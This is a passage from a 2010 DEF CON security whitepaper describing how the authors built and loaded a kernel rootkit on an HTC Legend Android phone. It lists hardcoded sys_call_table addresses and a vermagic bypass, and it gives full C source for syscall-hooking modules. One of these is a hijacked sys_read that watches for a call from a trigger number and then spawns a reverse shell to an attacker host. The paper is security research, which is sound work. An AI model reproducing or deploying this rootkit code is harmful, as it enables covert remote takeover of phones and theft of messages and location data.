our rootkit against published Linux kernel source code for the HTC Legend1.   
Upon review, this kernel source code published by HTC appears to have been hampered so that 
when a module is compiled against the source code it can not be subsequently loaded on the 
device. 
We will now examine each of these hurdles and how we overcame them to ultimately write and 
successfully load a Google Android rootkit on the HTC Legend. 
1  http://developer.htc.com 
Trustwave 
- 11 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
4.1 Hurdles we faced when developing the Android rootkit 
4.1.1 
Retrieving the sys_call_table address 
Linux kernels 2.5 or greater no longer export the sys_call_table structure. Prior to the 2.5 
kernels, an LKM could instantly access the sys_call_table structure by declaring it as an 
extern variable: 
extern void *sys_call_table[]; 
This is no longer the case. Various workarounds have been reported in literature involving 
Direct Kernel Object Manipulation (DKOM), most notably as was demonstrated by sd and devik 
in their pioneering SuckIT rootkit which was published in Phrack (8).   
However the sys_call_table address can be found in the System.map file as well. As we 
have full access to the source code, the sys_call_table can be found easily. This is shown 
below for the case of the Android emulator: 
root@argon:~/android/kernel-common# grep sys_call_table System.map 
c0021d24 T sys_call_table 
root@argon:~/android/kernel-common# 
In this case, the sys_call_table can be found at 0xc0021d24. 
The HTC Legend, our test device, shipped to us running the 2.6.29-9a3026a7  kernel.  In 
similar fashion, we downloaded the Linux kernel source code for the HTC Legend that HTC 
published on their HTC Developer Center, cross-compiled it and found the sys_call_table to 
be located at 0xc0029fa4 as seen below: 
root@argon:~/android/legend-kernel# grep sys_call_table System.map 
c0029fa4 T sys_call_table 
root@argon:~/android/legend-kernel# 
As all devices ship with the same firmware/running-kernel these sys_call_table addresses 
are static across a wide range of devices in the wild and no further heuristic sys_call_table 
discovery techniques are really necessary.  
Environment (uname –a) 
sys_call_table address 
Android Emulator (2.6.27-00110-g132305e) 
0xc0021d24 
HTC Legend (2.6.29-9a3026a7) 
0xc0029fa4 
Trustwave 
- 12 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
4.1.2 
Compiling against the HTC Legend Linux kernel source code 
As mentioned previously, the next hurdle we had to overcome was that when we compiled our 
rootkit against the HTC Legend kernel source code from http://developer.htc.com, the 
vermagic string of the module did not match that of the running kernel.  
This meant that we could not load the module on the phone. This is counter-intuitive, as one 
would expect that a module compiled against the HTC Legend Linux kernel source code should 
compile and subsequently load on the device seamlessly.  
This is shown below:  
# insmod debug.ko 
insmod: can't insert 'debug.ko': invalid module format 
# 
According to The Linux Documentation Project (9), the kernel refuses to accept the module 
because version strings (more precisely, version magics) do not match. Incidentally, version 
magics are stored in the module object in the form of a static string, starting with vermagic.  
debug: version magic '2.6.29 preempt mod_unload ARMv6' should be 
'2.6.29-9a3026a7 preempt mod_unload ARMv6 ' 
By examining the Linux kernel source code, we found that by modifying the following file 
include/linux/utsrelease.h 
From: 
root@argon:~/android# cat legend-kernel/include/linux/utsrelease.h 
#define UTS_RELEASE "2.6.29" 
root@argon:~/android# 
To:  
root@argon:~/android# cat legend-kernel/include/linux/utsrelease.h 
#define UTS_RELEASE "2.6.29-9a3026a7" 
root@argon:~/android# 
And re-compiling our module against the HTC Legend Linux kernel source code with these 
changes, resulted in the module loading cleanly as the vermagic strings matched.  
Trustwave 
- 13 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
This is shown below:  
# insmod debug.ko 
# lsmod 
debug 1832 0 - Live 0xbf000000 (P) 
# uname -a 
Linux localhost 2.6.29-9a3026a7 #1 PREEMPT Thu Feb 25 23:36:55 CST 2010 
armv6l GNU/Linux 
# 
Therefore, having found the address of sys_call_table and subsequently succeeded in 
loading the module in to the HTC Legend’s running kernel, what was left, was to ascertain 
which system calls were responsible for various phone functions.  
Once this was achieved, we would hijack these system calls, parse their arguments and act 
when certain trigger events occurred.  
We will now discuss how we went about achieving this. 
Trustwave 
- 14 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
4.1.3 
Enabling system call debugging  
We proceeded to create a debug module that intercepted the following system calls:  
• 
sys_write 
• 
sys_read 
• 
sys_open 
• 
sys_close 
These system calls are responsible for all file write, read open and close operations. The debug 
module is shown below:  
/* 
 * Christian Papathanasiou & Nicholas J. Percoco 
 * PI:EMAIL, PI:EMAIL 
 * (c) 2010 Trustwave  
 * 
 * Google Android rootkit debug LKM 
*/ 
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count); 
asmlinkage ssize_t (*orig_write) (int fd, char *buf, size_t count); 
asmlinkage ssize_t (*orig_open)(const char *pathname, int flags); 
asmlinkage ssize_t (*orig_close) (int fd); 
Trustwave 
- 15 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
asmlinkage ssize_t 
hacked_write (int fd, char *buf, size_t count) 
{ 
printk (KERN_INFO "SYS_WRITE: %s\n",buf); 
return orig_write(fd,buf,count); 
} 
asmlinkage ssize_t 
hacked_open(const char *pathname, int flags) { 
printk(KERN_INFO "SYS_OPEN: %s\n",pathname); 
return orig_open(pathname,flags); 
} 
asmlinkage ssize_t 
hacked_close(int fd) { 
printk(KERN_INFO "SYS_CLOSE %s\n",current->comm); 
return orig_close(fd); 
} 
asmlinkage ssize_t 
hacked_read (int fd, char *buf, size_t count) 
{ 
  printk (KERN_INFO "SYS_READ %s\n",buf); 
  return orig_read (fd, buf, count); 
} 
static int __init 
root_start (void) 
{ 
  unsigned long *sys_call_table = 0xc0029fa4; 
  orig_read = sys_call_table[__NR_read]; 
  sys_call_table[__NR_read] = hacked_read; 
  orig_write = sys_call_table[__NR_write]; 
  sys_call_table[__NR_write] = hacked_write; 
  orig_close = sys_call_table[__NR_close]; 
  sys_call_table[__NR_close] = hacked_close; 
  orig_open = sys_call_table[__NR_open]; 
  sys_call_table[__NR_open] = hacked_open; 
  return 0; 
} 
Trustwave 
- 16 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
static void __exit 
root_stop (void) 
{ 
 unsigned long *sys_call_table = 0xc0029fa4; 
  sys_call_table[__NR_read] = &orig_read; 
  sys_call_table[__NR_write] = &orig_write; 
  sys_call_table[__NR_close] = &orig_close; 
  sys_call_table[__NR_open] = &orig_open; 
} 
module_init (root_start); 
module_exit (root_stop); 
By compiling and loading this module into the HTC Legend’s current running-kernel we were 
able to generate system call traces of these system calls with their arguments. The call traces 
are simply the output of the dmesg command where all printk debugging information is output 
to. 
An example of a system call trace is shown below. Here, we called the rootkitted phone from a 
trigger number: 07841334111. By grepping through the dmesg output we find that our debug 
module captured the incoming call through the sys_read system call.  
root@argon:~/android/rootkit/traces# grep 07841334111 INCOMING-CALL-
TRACE 
sys_read: AT+CLCCc:13371585907841334111",129 
.. 
root@argon:~/android/rootkit/traces# 
More importantly, we see the AT+CLCC command which in ETSI (10) is described as the “List 
current calls” AT command is responsible for informing the call handlers that a call from a 
number, in this case, 07841334111 is incoming.   
Trustwave 
- 17 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
Similarly, when an outbound call is made, the following syscall trace was obtained:  
[ 2761.808654] sys_write: ATD+442073734841; 
From this we can see that there exists the potential to redirect outbound calls to other 
numbers, by hijacking sys_write and modifying the ATD+XXXXXXX buffer. It should be noted 
that the GSM modem device is /dev/smd0 and the GPS device is /dev/smd27. 
At this point, we have achieved the following objectives: 
1. We have found the sys_call_table for the HTC Legend. 
2. We have successfully compiled our LKM against the HTC Legend source code, bypassing 
the vermagic restrictions. 
3. We have hijacked syscalls and obtained debugging information from them. 
4. Through syscall debugging we have discovered phone routines that we can hijack. 
What is left is to put all these concepts together to create our rootkit. This will be described in 
the next section.  
Trustwave 
- 18 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
5 The Android rootkit 
5.1 sys_read system call hooking 
Our rootkit, Mindtrick, sends an attacker a reverse TCP over 3G/WiFI shell once it receives a call 
from a trigger number. From there, the attacker has full access to the underlying operating 
system and can proceed to read the SQLite3 SMS/MMS databases, query the GPS subsystem or 
even shut the phone down.   
The rootkit hijacks the sys_read system call and parses the buffer for the AT+CLCC command. 
Once it finds an occurrence of the AT+CLCC command it then ascertains whether the incoming 
number matches that of the attackers. If it matches it calls the reverseshell() function. 
In other words our hijacked sys_read function looks similar to the following:  
asmlinkage ssize_t 
hacked_read (int fd, char *buf, size_t count) 
{ 
  if (strstr (buf, "CLCC")) 
    { 
      if (strstr (buf, "66666666")) //trigger number 
         { 
            reverseshell (); 
         } 
    } 
 else { 
         return orig_read (fd, buf, count); 
      } 
} 
To invoke a reverse shell within kernel space we use the call_usermodehelper function. Our 
reverse shell is spawned as a child of a kernel thread called keventd.  
void 
reverseshell () 
{ 
  static char *path = "/data/local/shell"; 
  char *argv[] = { "/data/local/shell", "attacker-IP", "80", NULL }; 
  static char *envp[] = 
    { "HOME=/", "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", 
NULL }; 
  call_usermodehelper (path, argv, envp, 1); 
} 
Trustwave 
- 19 - 